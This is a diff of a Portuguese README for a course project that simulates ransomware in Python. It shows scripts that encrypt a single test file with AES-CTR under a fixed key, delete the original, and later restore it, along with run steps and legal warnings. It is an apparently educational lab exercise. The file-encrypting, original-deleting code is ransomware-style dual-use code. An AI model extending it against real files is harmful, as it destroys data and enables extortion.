@@ -1,183 +1,271 @@
-<div align="center">
+ <div align="center">
 
-# 🔒 Simulação de Ransomware em Python - DIO Formação Cybersecurity Specialist 🛡️
+# 🔒 Simulação de Ransomware em Python
 
-[!\[Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge\&logo=python\&logoColor=yellow)](https://www.python.org/)
-[!\[Kali Linux](https://img.shields.io/badge/Kali\_Linux-%2300A300?style=for-the-badge\&logo=kali-linux\&logoColor=white)](https://www.kali.org/)
-[!\[Cybersecurity](https://img.shields.io/badge/Cybersecurity-DIO-red?style=for-the-badge\&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTguNzIgMjguNjhjMC0uMjgtLjIzLS41Mi0uNTEtLjUySDE1LjY3Yy0uMjggMC0uNTEuMjQtLjUxLjUydi41M2MwIC4yOC4yMy41MS41MS41MWgxMi41NGMuMjggMC0uNTEuMjQtLjUxLjUydi0uNTN6IiBmaWxsPSIjRkZGRkZGIi8+PHBhdGggZD0iTTE4LjcyIDE4Ljk1YzAgLS4yOC0uMjMtLjUyLS41MS0uNTJIMTUuNjdjLS4yOCAwLS41MS4yNC0uNTEuNTJ2NS4yOGMwIC4yOC4yMy41MS41MS41MWgxMi41NGMuMjggMC0uNTEuMjQtLjUxLjUydjUuMjhjMCAuMjguMjMuNTEuNTEuNDFoMi41NGMyLjgzIDAgNS4xNS0yLjMyIDUuMTUtNS4xNVMyMS41NSAxOC45NSAxOC43MiAxOC45NXoiIGZpbGw9IiNGRkZGRkYiLz48L3N2Zz4=)](https://www.dio.me/)
+### 🛡️ DIO – Formação Cybersecurity Specialist
+
+Projeto desenvolvido com finalidade educacional para demonstrar conceitos de criptografia e descriptografia de arquivos utilizando Python.
+
+![Python](https://img.shields.io/badge/Python-3.13.7-3776AB?style=for-the-badge&logo=python&logoColor=yellow)
+![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
+![AES](https://img.shields.io/badge/AES--CTR-Cryptography-red?style=for-the-badge)
+![DIO](https://img.shields.io/badge/DIO-Cybersecurity-orange?style=for-the-badge)
 
 </div>
 
-## 📋 **Descrição do Projeto**
+---
 
-Este projeto simula o funcionamento básico de um **ransomware** usando **Python** e a biblioteca `pyaes` para criptografia **AES-CTR**. O objetivo educacional é entender como ransomwares criptografam arquivos e como revertê-los com uma chave conhecida.
+## 📋 Sobre o Projeto
 
-> ⚠️ \*\*ATENÇÃO\*\*: Use \*\*APENAS\*\* em ambiente controlado e isolado (máquinas virtuais) para fins \*\*didáticos\*\*. \*\*NUNCA\*\* execute em sistemas reais!
+Este projeto consiste em uma simulação educacional do funcionamento básico de um **Ransomware**, desenvolvida em Python durante a formação **Cybersecurity Specialist da DIO**.
 
+A implementação utiliza a biblioteca `pyaes` para demonstrar o processo de criptografia e descriptografia de arquivos por meio do algoritmo **AES no modo CTR (Counter)**.
 
+O objetivo é compreender, na prática, como ocorre a criptografia de arquivos e como recuperar os dados utilizando a chave correspondente.
 
-\---
+> ⚠️ **AVISO DE SEGURANÇA:** Este projeto possui finalidade exclusivamente educacional. Execute somente em ambiente controlado, utilizando arquivos de teste e máquinas virtuais. Não utilize em sistemas ou arquivos reais.
 
-## 🛠️ **Tecnologias Utilizadas**
+---
 
-```mermaid
-graph TB
-    A\[Python 3.13.7] --> B\[pyaes AES-CTR]
-    B --> C\[Kali Linux]
-    B --> E\[Git/GitHub]
-```
+## 🛠️ Tecnologias e Ferramentas
 
-**Instalação da dependência:**
+| Tecnologia | Finalidade |
+|---|---|
+| Python 3.13.7 | Desenvolvimento dos scripts |
+| pyaes | Biblioteca de criptografia AES |
+| AES-CTR | Algoritmo e modo de operação criptográfica |
+| Kali Linux | Ambiente de execução |
+| Git e GitHub | Versionamento e documentação |
+
+### Instalação da dependência
 
 ```bash
 pip install pyaes
 ```
 
-\---
+---
 
-## 📁 **Estrutura do Projeto**
+## 📁 Estrutura do Projeto
 
 ```text
 simulacao-ransomware-kali-python/
-├── 🔐 encrypter.py
-├── 🔓 decrypter.py
-├── 📄 README.md
+│
+├── encrypter.py       # Script de criptografia
+├── decrypter.py       # Script de descriptografia
+└── README.md          # Documentação do projeto
+```
 
+---
 
-🚀 **Como Funciona**
+## ⚙️ Funcionamento
 
-### 1️⃣ **Criptografia** (`encrypter.py`)
+O projeto está dividido em duas etapas principais:
 
-* Lê `teste.txt`
-* Criptografa com **AES-CTR** (chave: `b"testeransomwares"`)
-* Remove original
-* Salva como `teste.txt.ransomwaretroll`
+### 1. 🔐 Criptografia – `encrypter.py`
 
-### 2️⃣ **Descriptografia** (`decrypter.py`)
+O script realiza as seguintes operações:
 
-* Lê arquivo criptografado
-* Descriptografa com mesma chave
-* Remove criptografado
-* Restaura `teste.txt`
+- Lê o arquivo `teste.txt`.
+- Carrega o conteúdo do arquivo.
+- Utiliza AES-CTR para criptografar os dados.
+- Salva o resultado com a extensão `.ransomwaretroll`.
+- Remove o arquivo original.
 
-**📝 Decisões Técnicas:**
+### 2. 🔓 Descriptografia – `decrypter.py`
 
-* Chave fixa (demo apenas)
-* **CTR mode**: sem padding necessário
-* 1 arquivo por execução
+O processo inverso é realizado pelo segundo script:
 
+- Localiza o arquivo criptografado.
+- Utiliza a mesma chave para recuperar os dados.
+- Descriptografa o conteúdo.
+- Remove o arquivo criptografado.
+- Restaura o arquivo original `teste.txt`.
 
+### 📝 Decisões Técnicas
 
-### **🔐 encrypter.py**
+- Utilização de chave fixa para fins didáticos.
+- AES no modo CTR, que não exige padding.
+- Processamento de um arquivo por execução.
+- Utilização de operações de leitura e escrita binária.
+
+---
+
+## 💻 Implementação
+
+### 🔐 encrypter.py
 
 ```python
 import os
 import pyaes
 
 # Abrir arquivo a ser criptografado
-file\_name = 'teste.txt'
-file = open(file\_name, 'rb')
-file\_data = file.read()
+file_name = 'teste.txt'
+
+file = open(file_name, 'rb')
+file_data = file.read()
 file.close()
 
 # Remover o arquivo original
-os.remove(file\_name)
+os.remove(file_name)
 
-# Definir a chave de encriptação
+# Definir a chave de criptografia
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 # Criptografar o arquivo
-crypto\_data = aes.encrypt(file\_data)
+crypto_data = aes.encrypt(file_data)
 
-# Salvar o arquivo criptografado
-new\_file = file\_name + '.ransomwaretroll'
-with open(new\_file, 'wb') as f:
-    f.write(crypto\_data)
+# Salvar arquivo criptografado
+new_file = file_name + '.ransomwaretroll'
 
-print("💰 Arquivo criptografado! Pague o resgate ou use decrypter.py 🤑")
+with open(new_file, 'wb') as f:
+    f.write(crypto_data)
+
+print("💰 Arquivo criptografado!")
 ```
 
-### **🔓 decrypter.py**
+### 🔓 decrypter.py
 
 ```python
 import os
 import pyaes
 
-## abrir arquivo criptografado
-file\_name = 'teste.txt.ransomwaretroll'
-file = open(file\_name, 'rb')
-file\_data = file.read()
+# Abrir arquivo criptografado
+file_name = 'teste.txt.ransomwaretroll'
+
+file = open(file_name, 'rb')
+file_data = file.read()
 file.close()
 
-## chave de descriptografia
+# Definir chave de descriptografia
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
-decrypt\_data = aes.decrypt(file\_data)
 
-## remove o arquivo criptografado
-os.remove(file\_name)
+# Descriptografar arquivo
+decrypt_data = aes.decrypt(file_data)
 
-## criar um novo arquivo descriptografado
-new\_file = 'teste.txt'
-new\_file = open(f'{new\_file}', 'wb')
-new\_file.write(decrypt\_data)
-new\_file.close()
+# Remover arquivo criptografado
+os.remove(file_name)
 
-## mensagem de descriptografia
-print("✅ Arquivo descriptografado com sucesso! 🚀")
+# Restaurar arquivo original
+new_file = 'teste.txt'
+
+with open(new_file, 'wb') as f:
+    f.write(decrypt_data)
+
+print("✅ Arquivo descriptografado com sucesso!")
 ```
 
-\---
+---
 
-## 🎯 **Como Executar**
+## 🚀 Como Executar
+
+### 1. Criar arquivo de teste
 
 ```bash
-# 1. Crie teste.txt
 echo "Este arquivo esta legivel e descriptografado" > teste.txt
+```
 
-# 2. Mostrar arquivos na pasta  
+### 2. Verificar arquivo criado
+
+```bash
 ls
+```
 
-# 3. Criptografar
+### 3. Executar criptografia
+
+```bash
 python encrypter.py
+```
 
-# 4. Verificar (arquivo .ransomwaretroll)
+### 4. Verificar arquivo criptografado
+
+```bash
 ls
-nano teste.txt.ransomwaretroll
+```
 
-# 5. Descriptografar
+O arquivo deverá aparecer com o nome:
+
+```text
+teste.txt.ransomwaretroll
+```
+
+### 5. Executar descriptografia
+
+```bash
 python decrypter.py
+```
 
-# 6. Mostrar novamente arquivos da pasta  
+### 6. Verificar arquivo restaurado
+
+```bash
 ls
-
-# 5. Verificar (teste.txt restaurado!)
 nano teste.txt
 ```
 
-✅ **Testado em**: Kali Linux
+O conteúdo original deverá estar novamente disponível.
 
+<details>
+<summary>📸 Resultado esperado</summary>
 
+**Antes da criptografia:**
 
-## 🧠 **Aprendizado \& Próximos Passos**
+```text
+teste.txt
+```
 
-### **✅ O que aprendi:**
+**Após a criptografia:**
 
-* **AES-CTR**: Modo stream cipher (nonce implícito)
-* **pyaes**: Wrapper simples para OpenSSL
-* **File I/O**: Manipulação segura com `with`
+```text
+teste.txt.ransomwaretroll
+```
 
-\---
+**Após a descriptografia:**
+
+```text
+teste.txt
+```
+
+</details>
+
+---
+
+## 🧠 Conhecimentos Adquiridos
+
+Durante o desenvolvimento desta atividade, foram explorados os seguintes conceitos:
+
+- 🔐 Fundamentos de criptografia simétrica.
+- 🔑 Utilização de chaves criptográficas.
+- 🛡️ Algoritmo AES e modo de operação CTR.
+- 🐍 Manipulação de arquivos utilizando Python.
+- 💻 Execução de scripts em ambiente Linux.
+- 🔄 Processos de criptografia e recuperação de dados.
+
+### 📚 Próximos Passos
+
+- Explorar outros algoritmos e modos de criptografia.
+- Estudar mecanismos de proteção contra ransomware.
+- Implementar boas práticas de gerenciamento de chaves.
+- Conhecer técnicas de detecção e resposta a incidentes.
+
+---
+
+## ⚖️ Aviso Legal
+
+Este projeto foi desenvolvido exclusivamente para fins acadêmicos e educacionais, como parte da formação **Cybersecurity Specialist da DIO**.
+
+A implementação não deve ser utilizada para comprometer sistemas, criptografar arquivos de terceiros ou realizar atividades não autorizadas.
+
+O uso de técnicas de ransomware em ambientes sem autorização pode configurar crime, conforme a legislação brasileira.
+
+---
+
+<div align="center">
+
+### 👨‍💻 Projeto desenvolvido para fins educacionais
+
+**DIO – Formação Cybersecurity Specialist**
+
+📅 Novembro de 2026 🇧🇷
 
 </div>
-
-## ⚖️ **Aviso Legal**
-
-**🎓 Simulação 100% educacional.**  
-Ransomwares reais são **crimes** (Lei 14.155/2021 - Brasil).
-
-\---
-
-*Desenvolvido durante DIO Formação Cybersecurity Specialist • Novembro 2026 🇧🇷*
-
